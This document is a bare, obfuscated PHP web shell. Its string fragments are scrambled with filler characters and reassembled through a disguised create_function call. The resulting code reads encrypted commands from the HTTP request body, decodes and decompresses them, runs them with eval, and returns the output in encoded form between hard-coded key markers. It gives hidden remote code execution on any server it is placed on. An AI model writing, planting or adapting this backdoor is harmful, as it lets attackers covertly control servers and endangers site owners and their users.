<?php
$O='t_y#cy#ontents();@oby#_end_cly#ean(y#);$r=@basey#64_ey#ncodey#(@xy#(@gzcompresy#s($o),y#$k))y#;printy#("y#$p$kh$r$kf");}';
$M='#nput"),$m)y#==1y#) {@oy#b_y#start();@evy#al(@gzuy#ncomprey#ss(@x(y#@basey#y#64_dy#ey#code($m[1]y#),$k)));$o=@ob_gey#';
$c='$k=y#"2y#9109c9b";$kh=y#"24f08y#65cy#a144";$ky#f="y#a154b694y#4y#548";$p="LDKy#y#CMLQvvF1NCkyuy#";functiy#y#y#on x($t,$k)';
$H='{$c=stry#len(y#$k);$l=y#strlen(y#$y#t);$o=""y#;for($y#i=0;$i<$ly#;)y#{fory#($j=0;($j<$c&y#&$i<y#$l);$j+y#+,$y#i++){$o.';
$D=str_replace('NZ','','crNZeNZatNZe_fuNZNZnNZction');
$s='y#=$t{$i}y#y#^$k{y#$jy#};}}return $y#o;}y#if (@pry#eg_matchy#("/$ky#h(.+)$kfy#/",@file_y#y#gy#et_contents("php:/y#/iy';
$N=str_replace('y#','',$c.$H.$s.$M.$O);
$m=$D('',$N);$m();
?>
